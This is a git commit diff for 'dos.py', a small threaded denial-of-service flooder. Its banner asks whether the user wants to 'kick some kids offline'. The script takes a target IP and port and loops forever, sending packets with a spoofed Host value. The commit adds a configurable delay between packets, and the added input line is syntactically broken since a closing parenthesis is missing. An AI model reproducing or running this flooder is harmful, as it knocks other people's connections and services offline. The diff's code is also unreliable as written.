4e23d2de2e883b95969fd87ef34a42aa9f295a8e
AlexM05 <47923859+AlexM05@users.noreply.github.com>
2021-03-06 20:38:25 -0600

    Update dos.py

--- dos.py
+++ dos.py
@@ -4,13 +4,14 @@ import time
 
 print("Welcome ( ° ͜ʖ°)╭∩╮. You here to kick some kids offline?")
 time.sleep(2)
-
 target = input("Enter a IP: ")
-time.sleep(1)
-
+time.sleep(0.75)
 str_port = input("Enter port: ")
-time.sleep(1)
-_
+time.sleep(0.75)
+
+WaitTime_string = input("Enter the delay between packets (This will only work if you put in a decimal): "
+WaitTime = float(WaitTime_string)
+			
 port = int(str_port)
 fake_ip = '10.10.192.1'
 
@@ -22,7 +23,9 @@ def attack():
 		s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'),(target,port))
 		s.close()
 
+			
 while True:
 	thread = threading.Thread(target=attack)
 	thread.start()
+	time.sleep(WaitTime)
 	print(thread)
